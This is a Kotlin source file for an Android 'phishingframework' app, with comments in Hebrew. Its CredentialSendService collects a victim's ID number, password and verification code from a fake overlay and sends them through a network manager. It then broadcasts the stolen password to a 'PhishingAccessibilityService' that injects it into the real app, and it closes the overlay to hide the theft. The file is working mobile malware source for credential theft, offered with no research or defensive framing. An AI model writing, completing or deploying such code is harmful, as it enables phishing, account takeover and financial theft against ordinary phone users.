package com.example.phishingframework.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.example.phishingframework.models.Credentials
import com.example.phishingframework.network.NetworkManager
import com.example.phishingframework.utils.Constants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch

class CredentialSendService : Service() {

    companion object {
        private const val TAG = "CredentialSendService"
    }

    // מאפשר להריץ את שליחת הקרדנציאלס בצורה אסינכרונית ונקייה
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // חילוץ הנתונים מה-Intent
        val idNumber = intent?.getStringExtra("id") ?: run {
            Log.e(TAG, "ID is missing from intent")
            stopSelf()
            return START_NOT_STICKY
        }

        val password = intent.getStringExtra("password") ?: run {
            Log.e(TAG, "Password is missing from intent")
            stopSelf()
            return START_NOT_STICKY
        }

        val codeValue = intent.getStringExtra("code") ?: ""

        // יצירת אובייקט Credentials
        val credentials = Credentials(
            id = idNumber,
            password = password,
            code = codeValue
        )

        // שליחת הנתונים בצורה אסינכרונית
        serviceScope.launch {
            sendCredentials(credentials)
        }

        // נעצור את השירות בעצמנו לאחר הסיום
        return START_NOT_STICKY
    }

    private fun sendCredentials(credentials: Credentials) {
        Log.d(TAG, "Sending credentials for ID: ${credentials.id}")

        NetworkManager.sendCredentials(
            credentials = credentials,
            onSuccess = {
                Log.i(TAG, "Credentials sent successfully")

                // 1. שולחים Broadcast להודעה שהשליחה הצליחה
                // מי מקבל? PhishingOverlayActivity עם resultReceiver
                // התוצאה: פותח את האפליקציה האמיתית וסוגר את ה-overlay
                sendBroadcast(Intent(Constants.ACTION_CREDENTIALS_OK))

                // 2. Broadcast עם הסיסמה ל-AccessibilityService
                // מי מקבל? PhishingAccessibilityService עם injectorReceiver
                // התוצאה: שומר את הסיסמה להזרקה אוטומטית לאפליקציה האמיתית
                sendBroadcast(Intent(Constants.ACTION_INJECT_PASSWORD).apply {
                    putExtra("password", credentials.password)
                })

                // עצירת השירות
                stopSelf()
            },
            onFailure = { exception ->
                Log.e(TAG, "Failed to send credentials", exception)

                // שליחת הודעה על כישלון
                sendBroadcast(Intent(Constants.ACTION_CREDENTIALS_FAILED))

                // עצירת השירות
                stopSelf()
            }
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        // ביטול כל המשימות האסינכרוניות
        serviceJob.cancel()
        Log.d(TAG, "Service destroyed")
    }
}